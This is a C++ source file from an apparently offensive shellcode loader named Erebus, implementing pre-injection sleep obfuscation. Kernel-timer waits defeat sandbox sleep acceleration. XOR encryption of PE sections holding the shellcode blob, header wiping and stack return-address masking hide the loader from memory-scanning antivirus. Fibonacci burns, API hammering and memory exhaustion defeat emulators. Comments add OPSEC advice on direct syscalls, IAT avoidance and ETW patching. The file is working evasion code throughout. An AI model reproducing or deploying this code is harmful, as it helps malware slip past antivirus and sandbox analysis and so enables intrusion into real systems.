/*
 * Erebus Loader - Sleep Obfuscation
 *
 * Provides a jittered, timer-based pre-injection dwell that defeats several
 * common sandbox analysis techniques:
 *
 *   1. Sleep() / NtDelayExecution() acceleration - sandboxes commonly
 *      fast-forward kernel sleep calls.  NtCreateTimer + NtSetTimer arms a
 *      kernel timer object signalled at real wall-clock time and bypasses
 *      most sleep-acceleration implementations.
 *
 *   2. Memory scanning during dwell - mode 2 (Ekko-lite) XOR-encrypts
 *      all non-.text PE sections (including .rdata where the encrypted
 *      shellcode blob and key material reside) for the full dwell window.
 *      The sections are decrypted on wake before control returns to the
 *      caller.  This hides static signatures from memory-resident AV
 *      products that scan working-set pages during sleep.
 *
 *   3. Emulator / dynamic analysis exhaustion (mode 3) - combines three
 *      computation-heavy techniques before the timer wait:
 *        a) Fibonacci burn: iterates ~500k Fibonacci steps through
 *           intentionally branchy logic that is expensive for emulators
 *           to simulate but trivial for real hardware.
 *        b) API hammering: calls NtClose(invalid) 100k times.
 *           Emulators that model every system call pay ~100k dispatch
 *           overheads; real kernels short-circuit the invalid handle in
 *           a handful of cycles.
 *        c) Memory consumption: allocates 100 MB in 4 KB page-touched
 *           chunks via NtAllocateVirtualMemory to stress the emulator's
 *           virtual address space model, then frees immediately before
 *           the timer wait.
 *      The timer wait then follows, so the total wall-clock dwell is the
 *      computation time plus the configured base/jitter period.
 *
 * OPSEC Notes:
 *   - NtCreateTimer / NtSetTimer / NtWaitForSingleObject are pure NT calls
 *     routed through the selected syscall backend (TartarusGate shims or
 *     SysWhispers3 stubs).  No Win32 wrappers appear in the IAT.
 *   - Mode 2 calls NtProtectVirtualMemory to flip section permissions.
 *     If ETW is patched by RunEvasionPatches() (called before ObfuscatedDwell),
 *     these NtProtectVirtualMemory ETW events are suppressed.
 *   - All NT function pointers are resolved to the stack BEFORE the XOR
 *     pass in mode 2.  The shim page (TartarusGate) or Sw3 stub addresses
 *     live outside the loader PE sections and survive the XOR window.
 *   - [MALLEABLE] NtQueryPerformanceCounter provides the jitter seed.
 *     Replace with an alternative entropy source if this syscall is
 *     monitored in the target environment.
 */

#include "../../include/config.hpp"
#include "../../include/evasion/sleep_obfuscation.hpp"
#include "../../include/loader.hpp"
#include "../../include/evasion/syscall_backend.hpp"

#include <windows.h>
#ifndef EREBUS_NT_TYPES_DEFINED
#include <winternl.h>
#endif

// Helper: resolve an NT function via syscall backend first, PEB walk fallback.
// _hnt must be a valid ntdll HMODULE (may be NULL; fallback skipped if so).
#define _RESOLVE(_type, _name, _hnt) \
    _type _name = (_type)erebus::evasion::GetSyscallStub(H(#_name)); \
    if (!(_name) && (_hnt)) \
        (_name) = (_type)erebus::GetProcAddressC((_hnt), H(#_name))

#if CONFIG_SLEEP_OBFUSCATION_TYPE == 2 || CONFIG_SLEEP_OBFUSCATION_TYPE == 4
// ---------------------------------------------------------------------------
// Section XOR helpers (mode 2 and 4)
// ---------------------------------------------------------------------------

// XOR every byte in each non-.text PE section with the given key.
// pNtProtect must be a stack-cached NtProtectVirtualMemory pointer resolved
// BEFORE the first XOR pass; after .rdata/.idata is encrypted the IAT
// contains garbage and any Win32 or ImportFunction call would AV.
// The shim/ntdll VA stored in pNtProtect is outside our PE sections and
// is unaffected by the XOR.
static void _XorPeSections(HMODULE hmod, const BYTE* key, SIZE_T key_len,
                            typeNtProtectVirtualMemory pNtProtect)
{
    if (!hmod || !key || key_len == 0 || !pNtProtect) return;

    PIMAGE_DOS_HEADER dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hmod);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    PIMAGE_NT_HEADERS nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<PBYTE>(hmod) + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sect++)
    {
        // Skip .text - our code is executing from it.
        // Inline comparison avoids any CRT IAT dependency.
        const BYTE* n = sect->Name;
        if (n[0]=='.' && n[1]=='t' && n[2]=='e' && n[3]=='x' && n[4]=='t') continue;
        if (sect->Misc.VirtualSize == 0) continue;

        PBYTE base = reinterpret_cast<PBYTE>(hmod) + sect->VirtualAddress;
        DWORD size = sect->Misc.VirtualSize;

        // NtProtectVirtualMemory modifies *BaseAddress/*NumberOfBytesToProtect
        // (rounds to page boundaries), so use separate locals per call.
        PVOID  vb1 = base;
        SIZE_T vs1 = size;
        ULONG  old_prot = 0;
        if (!NT_SUCCESS(pNtProtect(NtCurrentProcess(), &vb1, &vs1,
                                   PAGE_READWRITE, &old_prot))) continue;

        for (DWORD j = 0; j < size; j++)
            base[j] ^= key[j % key_len];

        PVOID  vb2 = base;
        SIZE_T vs2 = size;
        pNtProtect(NtCurrentProcess(), &vb2, &vs2, old_prot, &old_prot);
    }
}

// Derive a 16-byte XOR key from a performance counter value.
// pNtQPC: stack-cached NtQueryPerformanceCounter; may be NULL (uses stack
// address as last-resort entropy).
static void _DeriveXorKey(BYTE out[16], typeNtQueryPerformanceCounter pNtQPC)
{
    LARGE_INTEGER pc = {};
    if (pNtQPC)
        pNtQPC(&pc, NULL);
    else
        pc.QuadPart = (ULONGLONG)(ULONG_PTR)out;

    const BYTE* src = reinterpret_cast<const BYTE*>(&pc.QuadPart);
    for (int i = 0; i < 16; i++)
        out[i] = src[i % 8] ^ (BYTE)(i * 0x5A ^ 0xC3);
}

#endif // CONFIG_SLEEP_OBFUSCATION_TYPE == 2 || 4

#if CONFIG_SLEEP_OBFUSCATION_TYPE == 4
// ---------------------------------------------------------------------------
// Full Ekko helpers (mode 4): PE header wipe + stack return-address XOR
// ---------------------------------------------------------------------------

// Zero the DOS + NT headers of the loader PE during sleep, restore on wake.
// Both the header page and the first section header page are wiped.
// pNtProtect must be pre-resolved before the XOR window opens.
static void _WipeOrRestorePeHeader(HMODULE hmod, bool restore,
                                   const BYTE* hdr_backup, SIZE_T hdr_sz,
                                   typeNtProtectVirtualMemory pNtProtect)
{
    if (!hmod || !pNtProtect || !hdr_backup || hdr_sz == 0) return;

    PVOID  base = (PVOID)hmod;
    SIZE_T sz   = hdr_sz;
    ULONG  old  = 0;
    if (!NT_SUCCESS(pNtProtect(NtCurrentProcess(), &base, &sz, PAGE_READWRITE, &old)))
        return;

    if (restore)
        RtlCopyMemory((PVOID)hmod, hdr_backup, hdr_sz);
    else
        RtlZeroMemory((PVOID)hmod, hdr_sz);

    pNtProtect(NtCurrentProcess(), &base, &sz, old, &old);
}

// XOR each saved return address in the current thread's stack frames using
// RtlCaptureContext + RtlLookupFunctionEntry + RtlVirtualUnwind.
// Operates in-place: on sleep, XOR the return addresses with key; on wake,
// XOR again with the same key to restore original values.
// Only processes up to MAX_FRAMES frames to bound execution time.
static constexpr DWORD MAX_EKKO_FRAMES = 64;

static void _XorStackFrames(const BYTE* key, SIZE_T key_len,
                             typeNtProtectVirtualMemory pNtProtect)
{
    if (!key || key_len == 0 || !pNtProtect) return;

#ifdef _WIN64
    // Capture the current register context. The unwind data lets us walk
    // the call chain without touching any IAT entries.
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    RtlCaptureContext(&ctx);

    for (DWORD frame = 0; frame < MAX_EKKO_FRAMES; ++frame) {
        ULONG64 image_base = 0;
        PRUNTIME_FUNCTION rf = RtlLookupFunctionEntry(ctx.Rip, &image_base, NULL);
        if (!rf) break;

        PVOID  handler_data  = NULL;
        ULONG64 establisher  = 0;
        CONTEXT prev_ctx = ctx;
        RtlVirtualUnwind(UNW_FLAG_NHANDLER, image_base, ctx.Rip,
                         rf, &ctx, &handler_data, &establisher, NULL);

        if (ctx.Rip == 0 || ctx.Rip == prev_ctx.Rip) break;

        // ctx.Rsp after unwind points one slot past the saved return address
        // that was popped to form ctx.Rip. The saved RA lives at prev Rsp - 8.
        // We want the PREVIOUS frame's stored return address, which is at
        // the RSP value we had BEFORE the unwind (prev_ctx.Rsp) minus 8 bytes
        // (the slot occupied by the return address the unwind consumed).
        // Actually after RtlVirtualUnwind, ctx.Rsp is the new Rsp for the caller
        // frame; the return address lives at (old_rsp - 8) which is ctx.Rsp - 8
        // from the callee's perspective. More precisely: the RSP of the callee
        // frame points to the return address slot. prev_ctx.Rsp IS that slot.
        ULONG64* ra_slot = (ULONG64*)prev_ctx.Rsp;

        // Make the stack page writable, XOR the stored RA, restore protection.
        PVOID  page = (PVOID)((ULONG_PTR)ra_slot & ~(ULONG_PTR)0xFFF);
        SIZE_T psz  = 0x1000;
        ULONG  old  = 0;
        if (!NT_SUCCESS(pNtProtect(NtCurrentProcess(), &page, &psz,
                                   PAGE_READWRITE, &old)))
            continue;

        BYTE* ra_bytes = (BYTE*)ra_slot;
        for (SIZE_T b = 0; b < sizeof(ULONG64); ++b)
            ra_bytes[b] ^= key[b % key_len];

        pNtProtect(NtCurrentProcess(), &page, &psz, old, &old);
    }
#else
    (void)key; (void)key_len; (void)pNtProtect;  // x86 unsupported
#endif
}

#endif // CONFIG_SLEEP_OBFUSCATION_TYPE == 4

#if CONFIG_SLEEP_OBFUSCATION_TYPE == 3
// ---------------------------------------------------------------------------
// Emulator exhaustion helpers (mode 3 only)
// ---------------------------------------------------------------------------

// Fibonacci burn: branch-heavy loop that is expensive for emulators
// to simulate but near-instantaneous on real hardware.
static volatile ULONGLONG _FibonacciBurn(DWORD iterations)
{
    volatile ULONGLONG a = 0, b = 1;
    for (DWORD i = 0; i < iterations; i++) {
        ULONGLONG c = a + b;
        a = b;
        b = c;
        if (b == 0) b = 1;
    }
    return b;
}

// API hammering via NtClose on invalid handles.  Real kernels reject the
// invalid handle in a few cycles; emulators pay a full dispatch overhead.
static void _HammerApi(DWORD count, typeNtClose pNtClose)
{
    if (!pNtClose) return;
    for (DWORD i = 0; i < count; i++)
        pNtClose((HANDLE)(ULONG_PTR)(i | 0xFFFFF000));
}

// Memory consumption: allocate and touch 100 MB in 4 KB pages via NT,
// then free immediately.  Forces the emulator to model a large VA delta.
static void _ConsumeMemory(typeNtAllocateVirtualMemory pNtAlloc,
                           typeNtFreeVirtualMemory pNtFree)
{
    if (!pNtAlloc || !pNtFree) return;

    PVOID  p     = NULL;
    SIZE_T total = 100ULL * 1024 * 1024; // 100 MB
    const SIZE_T page_sz = 4096;

    if (!NT_SUCCESS(pNtAlloc(NtCurrentProcess(), &p, 0, &total,
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return;

    for (SIZE_T off = 0; off < total; off += page_sz)
        ((BYTE*)p)[off] = (BYTE)(off & 0xFF);
    SecureZeroMemory(p, total);

    SIZE_T zero = 0;
    pNtFree(NtCurrentProcess(), &p, &zero, MEM_RELEASE);
}

#endif // CONFIG_SLEEP_OBFUSCATION_TYPE == 3

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

namespace erebus {
namespace evasion {

BOOL ObfuscatedDwell(ULONG base_ms, ULONG jitter_ms)
{
#if CONFIG_SLEEP_OBFUSCATION_TYPE == 0

    (void)base_ms;
    (void)jitter_ms;
    return TRUE;

#elif CONFIG_SLEEP_OBFUSCATION_TYPE == 4

    // ---- Resolve NT functions (mode 4) -------------------------------------
    // All resolutions BEFORE any XOR pass; shim VAs live outside PE sections.
    HMODULE _hnt = erebus::GetModuleHandleC(H("ntdll.dll"));

    _RESOLVE(typeNtCreateTimer,            NtCreateTimer,            _hnt);
    _RESOLVE(typeNtSetTimer,               NtSetTimer,               _hnt);
    _RESOLVE(typeNtWaitForSingleObject,    NtWaitForSingleObject,    _hnt);
    _RESOLVE(typeNtClose,                  NtClose,                  _hnt);
    _RESOLVE(typeNtQueryPerformanceCounter, NtQueryPerformanceCounter, _hnt);
    _RESOLVE(typeNtProtectVirtualMemory,   NtProtectVirtualMemory,   _hnt);

    // ---- Jitter -----------------------------------------------------------
    ULONG actual_ms = base_ms;
    if (jitter_ms > 0 && NtQueryPerformanceCounter) {
        LARGE_INTEGER pc = {};
        NtQueryPerformanceCounter(&pc, NULL);
        actual_ms += (ULONG)((ULONGLONG)pc.QuadPart % ((ULONGLONG)jitter_ms + 1));
    }
    if (actual_ms == 0) return TRUE;
    if (!NtCreateTimer || !NtSetTimer) return FALSE;

    // ---- Derive XOR key and capture PE header for restore ------------------
    HMODULE hSelf = (HMODULE)(*(PVOID*)((ULONG_PTR)__readgsqword(0x60) + 0x10));

    BYTE xor_key[16] = {};
    _DeriveXorKey(xor_key, NtQueryPerformanceCounter);

    // Backup the PE header region (DOS header + NT headers = up to 0x400 bytes).
    // We zero it during sleep and restore on wake.
    constexpr SIZE_T HDR_BACKUP_SZ = 0x400;
    BYTE hdr_backup[HDR_BACKUP_SZ] = {};
    RtlCopyMemory(hdr_backup, (PVOID)hSelf, HDR_BACKUP_SZ);

    // ---- Arm timer --------------------------------------------------------
    HANDLE hTimer = NULL;
    NTSTATUS st = NtCreateTimer(&hTimer, TIMER_ALL_ACCESS, NULL, 1);
    if (!NT_SUCCESS(st) || !hTimer) {
        typedef NTSTATUS(NTAPI* _pfnNtDE)(BOOLEAN, PLARGE_INTEGER);
        _pfnNtDE NtDelayExecution = (_pfnNtDE)erebus::GetProcAddressC(_hnt, H("NtDelayExecution"));
        if (NtDelayExecution) {
            LARGE_INTEGER iv;
            iv.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);
            NtDelayExecution(FALSE, &iv);
        }
        return FALSE;
    }
    LARGE_INTEGER due;
    due.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);
    NtSetTimer(hTimer, &due, NULL, NULL, FALSE, 0, NULL);

    // ---- Encrypt: XOR stack return addresses, wipe PE header, XOR sections -
    _XorStackFrames(xor_key, sizeof(xor_key), NtProtectVirtualMemory);
    _WipeOrRestorePeHeader(hSelf, false, hdr_backup, HDR_BACKUP_SZ, NtProtectVirtualMemory);
    _XorPeSections(hSelf, xor_key, sizeof(xor_key), NtProtectVirtualMemory);

    // ---- Wait -------------------------------------------------------------
    if (NtWaitForSingleObject)
        NtWaitForSingleObject(hTimer, FALSE, NULL);

    // ---- Decrypt: reverse in opposite order -------------------------------
    _XorPeSections(hSelf, xor_key, sizeof(xor_key), NtProtectVirtualMemory);
    _WipeOrRestorePeHeader(hSelf, true, hdr_backup, HDR_BACKUP_SZ, NtProtectVirtualMemory);
    _XorStackFrames(xor_key, sizeof(xor_key), NtProtectVirtualMemory);

    SecureZeroMemory(xor_key, sizeof(xor_key));
    SecureZeroMemory(hdr_backup, sizeof(hdr_backup));
    NtClose(hTimer);
    return TRUE;

#elif CONFIG_SLEEP_OBFUSCATION_TYPE == 3

    // ---- Resolve all NT functions needed by mode 3 ------------------------
    HMODULE _hnt = erebus::GetModuleHandleC(H("ntdll.dll"));

    _RESOLVE(typeNtAllocateVirtualMemory, NtAllocateVirtualMemory, _hnt);
    _RESOLVE(typeNtFreeVirtualMemory,     NtFreeVirtualMemory,     _hnt);
    _RESOLVE(typeNtClose,                 NtClose,                 _hnt);
    _RESOLVE(typeNtCreateTimer,           NtCreateTimer,           _hnt);
    _RESOLVE(typeNtSetTimer,              NtSetTimer,              _hnt);
    _RESOLVE(typeNtWaitForSingleObject,   NtWaitForSingleObject,   _hnt);
    _RESOLVE(typeNtQueryPerformanceCounter, NtQueryPerformanceCounter, _hnt);

    // ---- Emulator exhaustion ----------------------------------------------
    (void)_FibonacciBurn(500000);
    _HammerApi(100000, NtClose);
    _ConsumeMemory(NtAllocateVirtualMemory, NtFreeVirtualMemory);

    // ---- Jitter -----------------------------------------------------------
    ULONG actual_ms = base_ms;
    if (jitter_ms > 0 && NtQueryPerformanceCounter) {
        LARGE_INTEGER pc = {};
        NtQueryPerformanceCounter(&pc, NULL);
        actual_ms += (ULONG)((ULONGLONG)pc.QuadPart % ((ULONGLONG)jitter_ms + 1));
    }
    if (actual_ms == 0) return TRUE;
    if (!NtCreateTimer || !NtSetTimer) return FALSE;

    // ---- Timer wait -------------------------------------------------------
    HANDLE hTimer = NULL;
    NTSTATUS st = NtCreateTimer(&hTimer, TIMER_ALL_ACCESS, NULL,
                                1 /* NotificationTimer = manual-reset */);
    if (!NT_SUCCESS(st) || !hTimer) {
        typedef NTSTATUS(NTAPI* _pfnNtDE)(BOOLEAN, PLARGE_INTEGER);
        _pfnNtDE NtDelayExecution = (_pfnNtDE)erebus::GetProcAddressC(_hnt, H("NtDelayExecution"));
        if (NtDelayExecution) {
            LARGE_INTEGER iv;
            iv.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);
            NtDelayExecution(FALSE, &iv);
        }
        return FALSE;
    }

    LARGE_INTEGER due;
    due.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);
    NtSetTimer(hTimer, &due, NULL, NULL, FALSE, 0, NULL);
    if (NtWaitForSingleObject)
        NtWaitForSingleObject(hTimer, FALSE, NULL);
    NtClose(hTimer);
    return TRUE;

#else // MODE 1 or 2 (modes 3 and 4 handled above)

    // ---- Resolve NT functions (modes 1 and 2) -----------------------------
    // CRITICAL (mode 2): All resolutions happen here, before any XOR pass.
    // The returned shim VAs (TartarusGate) or Sw3 stub VAs are NOT inside
    // our PE sections and survive the XOR window intact.
    HMODULE _hnt = erebus::GetModuleHandleC(H("ntdll.dll"));

    _RESOLVE(typeNtCreateTimer,           NtCreateTimer,           _hnt);
    _RESOLVE(typeNtSetTimer,              NtSetTimer,              _hnt);
    _RESOLVE(typeNtWaitForSingleObject,   NtWaitForSingleObject,   _hnt);
    _RESOLVE(typeNtClose,                 NtClose,                 _hnt);
    _RESOLVE(typeNtQueryPerformanceCounter, NtQueryPerformanceCounter, _hnt);

#if CONFIG_SLEEP_OBFUSCATION_TYPE == 2
    _RESOLVE(typeNtProtectVirtualMemory,  NtProtectVirtualMemory,  _hnt);
#endif
    // Note: mode 4 (Full Ekko) has its own separate branch above and does not
    // fall through to this path.

    // ---- Jitter -----------------------------------------------------------
    ULONG actual_ms = base_ms;
    if (jitter_ms > 0) {
        LARGE_INTEGER pc = {};
        if (NtQueryPerformanceCounter)
            NtQueryPerformanceCounter(&pc, NULL);
        else
            pc.QuadPart = (ULONGLONG)(ULONG_PTR)&pc;
        actual_ms += (ULONG)((ULONGLONG)pc.QuadPart % ((ULONGLONG)jitter_ms + 1));
    }
    if (actual_ms == 0) return TRUE;
    if (!NtCreateTimer || !NtSetTimer) return FALSE;

    // ---- Create and arm timer ---------------------------------------------
    HANDLE hTimer = NULL;
    NTSTATUS st = NtCreateTimer(&hTimer, TIMER_ALL_ACCESS, NULL,
                                1 /* NotificationTimer = manual-reset */);
    if (!NT_SUCCESS(st) || !hTimer) {
        // Fallback: NtDelayExecution (less evasive but non-fatal).
        typedef NTSTATUS(NTAPI* _pfnNtDE)(BOOLEAN, PLARGE_INTEGER);
        _pfnNtDE NtDelayExecution = (_pfnNtDE)erebus::GetProcAddressC(_hnt, H("NtDelayExecution"));
        if (NtDelayExecution) {
            LARGE_INTEGER iv;
            iv.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);
            NtDelayExecution(FALSE, &iv);
        }
        return FALSE;
    }

    LARGE_INTEGER due;
    due.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);

#if CONFIG_SLEEP_OBFUSCATION_TYPE == 2
    // ---- Ekko-lite: XOR encrypt, wait, XOR decrypt ------------------------
    // Image base from PEB (offset 0x10 on x64) - no IAT dereference.
    HMODULE hSelf = (HMODULE)(*(PVOID*)((ULONG_PTR)__readgsqword(0x60) + 0x10));

    // Arm timer BEFORE XOR so NtSetTimer's shim VA is the only dependency.
    NtSetTimer(hTimer, &due, NULL, NULL, FALSE, 0, NULL);

    // Derive key and encrypt non-.text sections (IAT becomes garbage here).
    BYTE xor_key[16] = {};
    _DeriveXorKey(xor_key, NtQueryPerformanceCounter);
    _XorPeSections(hSelf, xor_key, sizeof(xor_key), NtProtectVirtualMemory);

    // Wait via stack-cached NT pointer (no IAT dereference).
    if (NtWaitForSingleObject)
        NtWaitForSingleObject(hTimer, FALSE, NULL);

    // Decrypt: XOR is involutory - same key restores original bytes + IAT.
    _XorPeSections(hSelf, xor_key, sizeof(xor_key), NtProtectVirtualMemory);
    SecureZeroMemory(xor_key, sizeof(xor_key));

    NtClose(hTimer);
    return TRUE;

#else
    // ---- Mode 1: plain NT timer wait --------------------------------------
    NtSetTimer(hTimer, &due, NULL, NULL, FALSE, 0, NULL);
    if (NtWaitForSingleObject)
        NtWaitForSingleObject(hTimer, FALSE, NULL);
    NtClose(hTimer);
    return TRUE;
#endif

#endif // CONFIG_SLEEP_OBFUSCATION_TYPE
}

} // namespace evasion
} // namespace erebus
